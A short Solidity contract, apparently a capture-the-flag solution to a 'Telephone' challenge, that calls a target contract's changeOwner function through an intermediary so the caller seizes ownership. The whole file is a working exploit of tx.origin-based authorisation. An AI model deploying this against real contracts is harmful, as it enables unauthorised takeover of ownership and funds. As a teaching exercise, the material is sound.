// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackTelephone {

  address public owner;
  address public telephoneContract;

  constructor(address _telephone) {
    telephoneContract = _telephone;
  }

  function attack() public {
    (bool success, ) = telephoneContract.call(abi.encodeWithSignature('changeOwner(address)', msg.sender));
    require(success);
  }
}